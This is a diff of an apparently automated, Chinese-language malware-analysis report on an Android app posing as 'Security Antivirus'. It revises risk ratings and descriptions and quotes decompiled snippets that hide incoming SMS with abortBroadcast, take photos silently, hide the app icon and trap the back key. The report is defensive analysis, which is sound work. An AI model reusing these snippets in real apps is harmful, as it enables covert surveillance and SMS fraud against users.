@@ -6,7 +6,7 @@
     "应用名": "Security Antivirus",
     "是否恶意": true,
     "风险等级": "高",
-    "分析耗时(秒)": 661.4
+    "分析耗时(秒)": 1180.3
   },
   "行为列表": [
     {
@@ -31,10 +31,10 @@
           "method_signature": "onStartCommand(Intent intent, int i, int i2)",
           "malicious_behavior": "c2_communication",
           "behavior_type": "malicious",
-          "risk_level": "中",
+          "risk_level": "高",
           "malicious_code_snippet": "public int onStartCommand(Intent intent, int i, int i2) {\n    if (intent != null) {\n        String action = intent.getAction();\n        String stringExtra = intent.getStringExtra(j);\n        if (\"com.supo.locker.SERVICE_START\".equalsIgnoreCase(action)) {\n            g();\n        } else {\n            if (ckb.a(this)) {\n                h();\n            }\n            if (\"com.supo.locker.LOCKER_CONFIG_ACTION\".equalsIgnoreCase(action)) {",
           "malicious_code_snippet_context": "      }\n  \n      @Override // android.app.Service\n>>>     public int onStartCommand(Intent intent, int i, int i2) {\n>>>         if (intent != null) {\n>>>             String action = intent.getAction();\n>>>             String stringExtra = intent.getStringExtra(j);\n>>>             if (\"com.supo.locker.SERVICE_START\".equalsIgnoreCase(action)) {\n>>>                 g();\n>>>             } else {\n>>>                 if (ckb.a(this)) {\n>>>                     h();\n>>>                 }\n>>>                 if (\"com.supo.locker.LOCKER_CONFIG_ACTION\".equalsIgnoreCase(action)) {\n                      f();\n                  }\n                  if (\"com.supo.locker.PRELOAD_AD_ACTION\".equalsIgnoreCase(action)) {",
-          "behavior_description": "该代码位于恶意样本的Service组件中，onStartCommand通过Intent action字符串（如com.supo.locker.SERVICE_START和com.supo.locker.LOCKER_CONFIG_ACTION）作为指令分发器，将外部传入的action映射到不同的处理方法g()、h()等。这种基于action的命令分发模式是C2控制服务的典型结构，外部触发源(Intent action)→命令分发执行(调用g()/h()等处理方法)，实现远程控制指令的接收与调度执行。",
+          "behavior_description": "该代码位于恶意样本的位置服务类 smloc 的 onStartCommand 方法中，是远程指令接收与分发的入口。代码从外部传入的 Intent 中提取 action 字段和字符串附加参数（stringExtra，可能为推送/广播下发的 C2 控制指令或配置内容），根据不同 action（如 com.supo.locker.SERVICE_START、com.supo.locker.LOCKER_CONFIG_ACTION）分发调用内部方法 g()/h()，启动位置追踪、配置更新等逻辑。结合厂商报告确认该样本会秘密收集用户数据并追踪地理位置，该服务作为 C2 控制通道的命令处理器，使远端服务器能够远程下发配置并控制恶意行为的开启与执行。",
           "glm_analyzed": true
         }
       ]
@@ -78,9 +78,70 @@
           "malicious_behavior": "sms_fraud",
           "behavior_type": "malicious",
           "risk_level": "高",
-          "malicious_code_snippet": "public void onReceive(Context context, Intent intent) {\n    if (intent.getAction().equalsIgnoreCase(\"android.provider.Telephony.SMS_RECEIVED\")) {\n        abortBroadcast();\n        Bundle extras = intent.getExtras();\n        if (extras != null) {\n            Object[] objArr = (Object[]) extras.get(\"pdus\");\n            SmsMessage[] smsMessageArr = new SmsMessage[objArr.length];\n            for (int i = 0; i < objArr.length; i++) {\n                smsMessageArr[i] = SmsMessage.createFromPdu((byte[]) objArr[i]);\n            }\n            for (SmsMessage smsMessage : smsMessageArr) {\n                smsMessage.getDisplayOriginatingAddress();\n            }\n        }\n    }\n}",
-          "malicious_code_snippet_context": "      final SimpleDateFormat f753a = new SimpleDateFormat(\"yyyy-MM-dd HH:mm:ss\");\n  \n      @Override // android.content.BroadcastReceiver\n>>>     public void onReceive(Context context, Intent intent) {\n>>>         if (intent.getAction().equalsIgnoreCase(\"android.provider.Telephony.SMS_RECEIVED\")) {\n>>>             abortBroadcast();\n>>>             new StringBuilder();\n>>>             Bundle extras = intent.getExtras();\n>>>             if (extras != null) {\n>>>                 Object[] objArr = (Object[]) extras.get(\"pdus\");\n>>>                 SmsMessage[] smsMessageArr = new SmsMessage[objArr.length];\n>>>                 for (int i = 0; i < objArr.length; i++) {\n>>>                     smsMessageArr[i] = SmsMessage.createFromPdu((byte[]) objArr[i]);\n>>>                 }\n>>>                 for (SmsMessage smsMessage : smsMessageArr) {\n>>>                     smsMessage.getDisplayOriginatingAddress();\n>>>                     smsMessage.getMessageBody();\n>>>                     this.f753a.format(new Date(smsMessage.getTimestampMillis()));\n>>>                 }\n              }\n          }\n      }",
-          "behavior_description": "该广播接收器监听 SMS_RECEIVED 广播，收到短信后立即调用 abortBroadcast() 中止广播传播，阻止系统短信应用及其他应用收到短信通知，实现短信拦截隐藏。随后从 intent 的 extras 中提取 pdus 数据并解析为 SmsMessage 对象，读取发件人地址等短信内容。数据流向：SMS_RECEIVED 广播 Intent(extras/pdus) → abortBroadcast() 中止广播 + 解析短信内容",
+          "malicious_code_snippet": "if (intent.getAction().equalsIgnoreCase(\"android.provider.Telephony.SMS_RECEIVED\")) {\n    abortBroadcast();\n    Bundle extras = intent.getExtras();\n    Object[] objArr = (Object[]) extras.get(\"pdus\");\n    SmsMessage[] smsMessageArr = new SmsMessage[objArr.length];\n    for (int i = 0; i < objArr.length; i++) {\n        smsMessageArr[i] = SmsMessage.createFromPdu((byte[]) objArr[i]);\n    }\n    for (SmsMessage smsMessage : smsMessageArr) {\n        smsMessage.getDisplayOriginatingAddress();\n    }\n}",
+          "malicious_code_snippet_context": "  \n      @Override // android.content.BroadcastReceiver\n      public void onReceive(Context context, Intent intent) {\n>>>         if (intent.getAction().equalsIgnoreCase(\"android.provider.Telephony.SMS_RECEIVED\")) {\n>>>             abortBroadcast();\n>>>             new StringBuilder();\n>>>             Bundle extras = intent.getExtras();\n>>>             if (extras != null) {\n>>>                 Object[] objArr = (Object[]) extras.get(\"pdus\");\n>>>                 SmsMessage[] smsMessageArr = new SmsMessage[objArr.length];\n>>>                 for (int i = 0; i < objArr.length; i++) {\n>>>                     smsMessageArr[i] = SmsMessage.createFromPdu((byte[]) objArr[i]);\n>>>                 }\n>>>                 for (SmsMessage smsMessage : smsMessageArr) {\n>>>                     smsMessage.getDisplayOriginatingAddress();\n                      smsMessage.getMessageBody();\n                      this.f754a.format(new Date(smsMessage.getTimestampMillis()));\n                  }",
+          "behavior_description": "该 BroadcastReceiver 监听系统短信到达广播 android.provider.Telephony.SMS_RECEIVED，在收到短信时首先调用 abortBroadcast() 终止广播继续传播，使系统短信应用和其他正常接收器无法收到该短信，从而对用户隐藏短信（如验证码、银行通知）；随后从 Intent extras 中提取 pdus 数据，通过 SmsMessage.createFromPdu() 解析出短信的发送方号码和内容。数据流向：系统短信广播（SMS_RECEIVED 的 PDU 数据）→ abortBroadcast() 拦截隐藏短信 + 解析短信发送者地址与内容。结合厂商报告确认该样本为恶意应用（伪装安全工具实施数据窃取），此短信拦截行为可隐藏验证码和扣费通知，属于典型短信欺诈/拦截恶意行为。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "keylogging",
+      "中文名": "键盘记录",
+      "MITRE": "T1417",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "dispatchKeyEvent"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lan\\sc\\clean\\v\\smgrant;",
+          "method_signature": "dispatchKeyEvent(KeyEvent keyEvent)",
+          "malicious_behavior": "keylogging",
+          "behavior_type": "grayware",
+          "risk_level": "低",
+          "malicious_code_snippet": "public boolean dispatchKeyEvent(KeyEvent keyEvent) {\n    switch (keyEvent.getKeyCode()) {\n        case 4:\n        case 82:\n            f();\n            break;\n    }\n    return super.dispatchKeyEvent(keyEvent);\n}",
+          "malicious_code_snippet_context": "      }\n  \n      @Override // android.view.ViewGroup, android.view.View\n>>>     public boolean dispatchKeyEvent(KeyEvent keyEvent) {\n>>>         switch (keyEvent.getKeyCode()) {\n>>>             case 4:\n>>>             case 82:\n>>>                 f();\n>>>                 break;\n>>>         }\n>>>         return super.dispatchKeyEvent(keyEvent);\n>>>     }\n  \n      /* JADX INFO: Access modifiers changed from: private */\n      public void f() {",
+          "behavior_description": "该代码重写了 ViewGroup 的 dispatchKeyEvent 方法，拦截用户的物理按键事件，当检测到返回键（keyCode=4，KEYCODE_BACK）或菜单键（keyCode=82，KEYCODE_MENU）被按下时调用 f() 方法。这并非真正的键盘记录行为——它没有记录、存储或外传用户的按键内容，只针对两个导航键做拦截。结合该样本为广告类恶意应用（厂商报告确认其推送广告、收集数据），此类按键拦截通常用于阻止用户通过返回键关闭广告弹窗/悬浮界面，或按键触发重新展示广告，属于广告类灰色软件常见的用户困留（trapping）手法。数据流向：用户按键输入（KeyEvent.getKeyCode()）→ 按键码匹配判断 → 触发 f()（疑似重新拉起广告界面或阻止弹窗关闭）。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "silent_install_uninstall",
+      "中文名": "静默安装/卸载",
+      "MITRE": "",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "silent_uninstall",
+          "中文名": "静默卸载",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.DELETE_PACKAGES"
+            ],
+            "字符串": [
+              "android.intent.action.DELETE"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lan\\sc\\clean\\v\\sminstall;",
+          "method_signature": "onClick(View view)",
+          "malicious_behavior": "silent_install_uninstall",
+          "behavior_type": "grayware",
+          "risk_level": "中",
+          "malicious_code_snippet": "Intent intent = new Intent(\"android.intent.action.DELETE\", Uri.parse(\"package:\" + sminstall.this.b.getPackageName()));\nintent.addFlags(268435456);\nsminstall.this.d.startActivity(intent);",
+          "malicious_code_snippet_context": "              public void onClick(View view) {\n                  sminstall.this.d();\n                  ((NotificationManager) sminstall.this.d.getSystemService(\"notification\")).cancel(sminstall.this.c);\n>>>                 Intent intent = new Intent(\"android.intent.action.DELETE\", Uri.parse(\"package:\" + sminstall.this.b.getPackageName()));\n>>>                 intent.addFlags(268435456);\n>>>                 sminstall.this.d.startActivity(intent);\n                  smpuutl.b(wz.a(Integer.valueOf(sminstall.this.c)), 0);\n              }\n          });",
+          "behavior_description": "该代码位于伪装成安全工具（Security Defender/Advanced Boost类）的恶意应用中。用户点击按钮后，代码取消通知栏提示，然后构造 ACTION_DELETE Intent（Uri 为 package:目标应用包名），并添加 FLAG_ACTIVITY_NEW_TASK 后调用 startActivity() 调起系统卸载确认对话框。数据流向：从 sminstall.this.b.getPackageName() 获取目标应用包名 → 作为 Intent data 传入系统卸载流程。需要说明的是，该方式并非真正的静默卸载（无 root/设备管理员权限下无法调用 deletePackage 静默删除），仍需用户在系统弹窗中手动确认。但在该恶意样本的虚假安全扫描欺骗场景下，此行为属于诱导用户卸载其他应用（可能为竞品应用或安全软件）的社会工程学手段，配合 smpuutl.b() 记录操作状态以避免重复提示。",
           "glm_analyzed": true
         }
       ]
@@ -106,10 +167,10 @@
           "method_signature": "if(this.c != null && !this.c.isRecycled()",
           "malicious_behavior": "camera_capture",
           "behavior_type": "malicious",
-          "risk_level": "中",
-          "malicious_code_snippet": "cjh.a(\"takePicture\").a(new Runnable() {\n    @Override\n    public void run() {\n        Looper.prepare();\n        try {\n            cjm.this.f3929a = surfaceView.getHolder();\n            cjm.this.f3929a.setType(3);\n            cjm.this.a(cjm.this.f3929a);\n        } catch (Exception e) {\n            e.printStackTrace();\n            cjm.this.h = true;\n        }\n    }\n});",
-          "malicious_code_snippet_context": "              this.c.recycle();\n              this.c = null;\n          }\n>>>         cjh.a(\"takePicture\").a(new Runnable() { // from class: ns.cjm.1\n>>>             @Override // java.lang.Runnable\n>>>             public void run() {\n>>>                 Looper.prepare();\n>>>                 try {\n>>>                     cjm.this.f3929a = surfaceView.getHolder();\n>>>                     cjm.this.f3929a.setType(3);\n>>>                     cjm.this.a(cjm.this.f3929a);\n>>>                 } catch (Exception e) {\n>>>                     e.printStackTrace();\n>>>                     cjm.this.h = true;\n>>>                 }\n>>>                 if (cjm.this.b != null) {\n>>>                     Thread.sleep(500L);\n                      cjm.this.b.takePicture(null, null, cjm.this.k);\n                      Looper.loop();\n                  }",
-          "behavior_description": "该代码在恶意样本中通过标记为\"takePicture\"的异步任务初始化相机预览，获取 SurfaceView 的 SurfaceHolder 并设置类型为 PUSH_BUFFERS(3)，随后调用自定义方法 a() 进行相机配置/拍照操作。在已确认的恶意样本上下文中，此行为属于摄像头秘密调用的初始化阶段，可能用于在后台静默拍摄用户照片以窃取隐私图像。",
+          "risk_level": "高",
+          "malicious_code_snippet": "cjh.a(\"takePicture\").a(new Runnable() {\n    public void run() {\n        Looper.prepare();\n        cjm.this.f3930a = surfaceView.getHolder();\n        cjm.this.f3930a.setType(3);\n        cjm.this.a(cjm.this.f3930a);\n        if (cjm.this.b != null) {\n            Thread.sleep(500L);\n            cjm.this.b.takePicture(null, null, cjm.this.k);\n        }\n    }\n});",
+          "malicious_code_snippet_context": "              this.c.recycle();\n              this.c = null;\n          }\n>>>         cjh.a(\"takePicture\").a(new Runnable() { // from class: ns.cjm.1\n>>>             @Override // java.lang.Runnable\n>>>             public void run() {\n>>>                 Looper.prepare();\n>>>                 try {\n>>>                     cjm.this.f3930a = surfaceView.getHolder();\n>>>                     cjm.this.f3930a.setType(3);\n>>>                     cjm.this.a(cjm.this.f3930a);\n>>>                     if (cjm.this.b != null) {\n>>>                         Thread.sleep(500L);\n>>>                         cjm.this.b.takePicture(null, null, cjm.this.k);\n>>>                     } else {\n                          return;\n                      }\n                  } catch (Exception e) {",
+          "behavior_description": "该代码在名为 takePicture 的后台线程中执行：先通过 Looper.prepare() 创建消息循环，从外部传入的 SurfaceView 获取 SurfaceHolder 并设置为 PUSH_BUFFERS 类型，随后调用 this.a(holder)（推断为 Camera.open 并启动预览），休眠 500ms 等待摄像头就绪后，直接调用 Camera.takePicture(null, null, this.k) 完成拍照，照片 JPEG 数据由回调 this.k 静默处理。整个流程由程序自动触发，无需用户点击快门或感知摄像头工作状态，属于秘密调用摄像头采集影像数据的行为。数据流向：摄像头硬件（SurfaceView 预览表面）→ Camera.takePicture() 静默拍照 → 回调 k 获取图像数据（可被进一步保存或上传）。结合该样本已被厂商确认存在隐蔽收集用户数据行为，此秘密拍照构成隐私窃取。",
           "glm_analyzed": true
         }
       ]
@@ -135,7 +196,7 @@
           "risk_level": "中",
           "malicious_code_snippet": "context.getPackageManager().setComponentEnabledSetting(componentName, z ? 0 : 2, 1);",
           "malicious_code_snippet_context": "              return false;\n          }\n          try {\n>>>             context.getPackageManager().setComponentEnabledSetting(componentName, z ? 0 : 2, 1);\n              return true;\n          } catch (Exception e2) {\n              e2.printStackTrace();",
-          "behavior_description": "通过 PackageManager.setComponentEnabledSetting 动态启用/禁用组件，当传入参数 z 为 false 时将目标组件设置为 DISABLED 状态(值2)，使应用图标从启动器中隐藏。恶意软件常在安装后调用此方法隐藏自身图标，避免被用户发现和卸载，同时后台继续执行恶意行为。",
+          "behavior_description": "该方法通过 PackageManager.setComponentEnabledSetting 动态切换指定组件（通常是入口 Launcher Activity）的启用状态：当 z 为 false 时将组件设置为 COMPONENT_ENABLED_STATE_DISABLED(2)，使应用图标从桌面启动器中消失；当 z 为 true 时设置为 ENABLED(0) 恢复显示。第三个参数传 1（DONT_KILL_APP）保证切换时进程不被杀死，应用可在图标隐藏后继续在后台存活运行。数据流向：外部传入的 componentName（入口 Activity 组件名）→ setComponentEnabledSetting 危险操作（禁用组件实现图标隐藏）。这是恶意样本典型的隐蔽驻留手法，配合该样本已确认的数据窃取、位置追踪和广告推送行为，用于躲避用户察觉与卸载。",
           "glm_analyzed": true
         }
       ]
@@ -148,7 +209,7 @@
     "JADX反编译": "完整",
     "LLM语义分析": "已执行",
     "LLM交叉验证": "已执行",
-    "验证模型": "qwen3.7-plus",
+    "验证模型": "qwen3.8",
     "局限性": [
       "C2服务器.是否活跃: 需动态分析",
       "C2服务器.轮询间隔(秒): 需动态分析"
